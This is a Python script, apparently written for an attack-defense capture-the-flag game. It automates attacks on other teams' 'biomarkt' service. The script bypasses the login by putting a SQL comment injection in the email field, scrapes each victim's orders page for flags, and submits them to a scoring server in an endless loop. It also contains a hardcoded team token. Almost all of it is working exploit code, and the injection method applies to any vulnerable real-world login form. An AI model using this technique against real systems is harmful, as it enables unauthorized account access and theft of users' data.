#/usr/bin/python3

import requests, time, re

TEAM_TOKEN = 'ddfe3c79ffdb518891f4f82ea90b433f'

chall = "biomarkt"

def exploit(json):
	lista = []
	c = 0
	for ip in json[chall]:
		c += 1
		size = len(json[chall])
		print(f"{c} / {size} ...")
		for username in json[chall][ip]:
			try:
				flag = get(ip, username)
				print(flag)
			except Exception as e:
				print("ERR {}".format(e))
				continue
			if flag not in lista:
				lista.append(flag)
	return lista
			
	
def get(ip, username):
	session = requests.Session()
	url = f"http://{ip}:18080/login"
	
	data = {"email": username+"' -- ", "password": "a"}
	resp1 = session.post(url, data=data, timeout=10)
	uid = resp1.text.split("orders?uid=")[1].split('">')[0]
	resp2 = session.get(f"http://{ip}:18080/orders?uid={uid}", timeout=10)
	
	flag = re.findall("[A-Z0-9]{31}=", resp2.text)[0]
	return flag
	


# TEST
# username = "rLLxSL@mail.com"
# flag = get("10.60.85.1", username)
# print(flag)



#OK
while True:
	print("Running exploit...")
	j = requests.get("http://10.10.0.1:8081/flagIds").json()
	flags = exploit(j)
	print(flags)

	print("Putting flags...")
	r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN},json=flags).text
	print(r)
	print("Exploit ok...\nRepeat...")
	print("\n")

	time.sleep(30)




